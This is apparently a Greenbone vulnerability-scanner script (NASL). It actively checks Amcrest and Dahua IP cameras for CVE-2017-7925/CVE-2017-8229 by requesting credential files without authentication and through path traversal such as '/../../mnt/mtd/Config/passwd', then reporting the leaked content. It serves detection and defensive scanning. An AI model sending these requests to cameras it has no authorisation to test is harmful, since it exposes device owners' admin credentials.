# SPDX-FileCopyrightText: 2024 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.114316");
  script_version("2024-02-01T08:01:48+0000");
  script_tag(name:"last_modification", value:"2024-02-01 08:01:48 +0000 (Thu, 01 Feb 2024)");
  script_tag(name:"creation_date", value:"2024-01-31 09:37:34 +0000 (Wed, 31 Jan 2024)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-07-11 02:29:10 +0000 (Thu, 11 Jul 2019)");

  script_cve_id("CVE-2017-7925", "CVE-2017-8229");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Multiple Devices Information Disclosure / Path Traversal Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2024 Greenbone AG");
  script_family("Web application abuses");
  # nb: No specific dependency to detections because different models / devices or even branded
  # devices might be affected as well...
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning", "Host/runs_windows");

  script_tag(name:"summary", value:"Multiple devices are prone to information disclosure and / or
  path traversal vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP GET requests and checks the
  responses.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2017-7925, CVE-2017-8229: Files like e.g. /current_config/Sha1Account1 are accessible
  without authentication containing unencrypted credentials.

  - No CVE: Direct access to files via requests like e.g. '../../mnt/mtd/Config/Sha1Account1'");

  script_tag(name:"impact", value:"An unauthenticated attacker may e.g. obtain sensitive information
  like admin credentials and use this for further attacks.");

  script_tag(name:"affected", value:"The following devices are known to be affected:

  - Amcrest IPM-721S

  - Varuizs Dahua DH and DHI models

  Other devices and vendors might be affected as well.");

  script_tag(name:"solution", value:"- According to 3rdparty sources Amcrest has provided firmware
  updates to fix the relevant flaw

  - Dahua seems to also provide updates

  - All vendors: Please contact the vendor for more information about possible fixes");

  script_xref(name:"URL", value:"https://github.com/ethanhunnt/IoT_vulnerabilities/blob/master/Amcrest_sec_issues.pdf");
  script_xref(name:"URL", value:"https://web.archive.org/web/20171227224523/http://us.dahuasecurity.com/en/us/Security-Bulletin_030617.php");
  script_xref(name:"URL", value:"https://www.cisa.gov/news-events/ics-advisories/icsa-17-124-02");
  script_xref(name:"URL", value:"https://seclists.org/bugtraq/2019/Jun/8");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121095109/http://www.securityfocus.com/bid/98312");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("os_func.inc");

# nb: No need to throw this against all Windows hosts (e.g. IIS) as we know that the devices are only
# running Linux.
if( os_host_runs( "windows" ) == "yes" )
  exit( 99 );

port = http_get_port( default:80 );

# nb: The ones seen on/in e.g.:
#
# - page 3 of https://github.com/ethanhunnt/IoT_vulnerabilities/blob/master/Amcrest_sec_issues.pdf
# - 2019/amcrest/gb_amcrest_ip_camera_mult_vuln_jun19.nasl
# - 2017/gb_dahua_auth_bypass_03_17.nasl
#
# and for the files like "Sha1Account1", "Account2" and similar
#
account_files_check_pattern_1 = '"DevInformation"\\s*:\\s*\\{';
account_files_check_pattern_2 = '"Password"\\s*:\\s*"[^"]+"\\s*,';
account_files_check_pattern_3 = '"(Group|Name)"\\s*:\\s*"[^"]+"\\s*,';

# nb: The one seen on/in e.g.:
#
# - 2017/gb_dahua_auth_bypass_03_17.nasl
# - https://forum.lowyat.net/index.php?showtopic=4243746&view=findpost&p=84493544
#
# and for the "passwd" file
#
pwd_files_check_string = "id:name:passwd:groupid:";

account_files = make_list(
  "/current_config/Sha1Account1",
  "/current_config/Sha1Account2",
  "/current_config/Account1",
  "/current_config/Account2",
  "/../../mnt/mtd/Config/Sha1Account1",
  "/../../mnt/mtd/Config/Sha1Account2",
  "/../../mnt/mtd/Config/Account1",
  "/../../mnt/mtd/Config/Account2"
);

pwd_files = make_list(
  "/current_config/passwd",
  "/../../mnt/mtd/Config/passwd"
);

# nb: Just some initial checks for checking if any "generic" or 404 page is containing our pattern
# to avoid possible false positives.
fp_check_urls = make_list(
  "/",
  "/vt-test-non-existent.html",
  "/vt-test/vt-test-non-existent.html"
);

foreach fp_check_url( fp_check_urls ) {

  res = http_get_cache( port:port, item:fp_check_url );
  if( ! res || res !~ "^HTTP/1\.[01] [0-9]+" )
    continue;

  # nb: No continue here, we can't do a reliable check in this case...
  if( pwd_files_check_string >< res )
    exit( 0 );

  # nb: Similar to the case above but we're jumping out on 2+ hits on the patterns
  found = 0;

  if( egrep( string:res, pattern:account_files_check_pattern_1, icase:FALSE ) )
    found++;

  if( egrep( string:res, pattern:account_files_check_pattern_2, icase:FALSE ) )
    found++;

  if( egrep( string:res, pattern:account_files_check_pattern_3, icase:FALSE ) )
    found++;

  if( found >= 2 )
    exit( 0 );
}

foreach pwd_file( pwd_files ) {

  req = http_get( item:pwd_file, port:port );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
  if( ! res )
    continue;

  if( pwd_files_check_string >< res ) {
    report = http_report_vuln_url( port:port, url:pwd_file );
    report += '\n\nResponse (possibly truncated):\n\n' + substr( res, 0, 1000 );
    security_message( port:port, data:chomp( report ) );
    exit( 0 );
  }
}

foreach account_file( account_files ) {

  req = http_get( item:account_file, port:port );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
  if( ! res )
    continue;

  found = 0;

  if( egrep( string:res, pattern:account_files_check_pattern_1, icase:FALSE ) )
    found++;

  if( egrep( string:res, pattern:account_files_check_pattern_2, icase:FALSE ) )
    found++;

  if( egrep( string:res, pattern:account_files_check_pattern_3, icase:FALSE ) )
    found++;

  if( found >= 2 ) {
    report = http_report_vuln_url( port:port, url:account_file );
    report += '\n\nResponse (possibly truncated):\n\n' + substr( res, 0, 1000 );
    security_message( port:port, data:chomp( report ) );
    exit( 0 );
  }
}

exit( 99 );
